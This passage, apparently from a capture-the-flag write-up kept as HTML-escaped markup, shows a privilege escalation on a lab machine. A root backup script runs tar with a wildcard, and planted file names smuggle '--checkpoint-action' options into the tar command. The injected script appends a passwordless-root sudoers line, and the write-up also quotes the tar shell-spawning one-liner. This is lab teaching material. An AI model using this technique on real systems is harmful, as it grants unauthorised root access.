&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat backup.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#!/bin/bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /var/www/html
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar cf /home/milesdyson/backups/backup.tgz *
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This script is very simple, it just goes to the &lt;code>/var/www/html&lt;/code> folder and archiving all of the data inside &lt;code>/home/milesdyson/backups/backup.tgz *&lt;/code>&lt;/p>
&lt;p>The thing is, that we can write inside the &lt;code>/var/www/html&lt;/code> directory.&lt;/p>
&lt;p>So we can use this GTFObin script:&lt;/p>
&lt;p>&lt;strong>Shell&lt;/strong>&lt;/p>
&lt;p>It can be used to break out from restricted environments by spawning an interactive system shell.&lt;/p>
&lt;ul>
&lt;li>&lt;code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>What you have to do is run the following in the /var/www/html folder (which is being backed up).&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">echo&lt;/span> &lt;span class="s1">&amp;#39;echo &amp;#34;www-data ALL=(root) NOPASSWD: ALL&amp;#34; &amp;gt;&amp;gt; /etc/sudoers&amp;#39;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">sudo&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">touch&lt;/span> &lt;span class="s2">&amp;#34;/var/www/html/--checkpoint-action=exec=sh sudo.sh&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">touch&lt;/span> &lt;span class="s2">&amp;#34;/var/www/html/--checkpoint=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And after a minute we have root access just by using: &lt;code>sudo su&lt;/code>&lt;/p></description></item></channel></rss>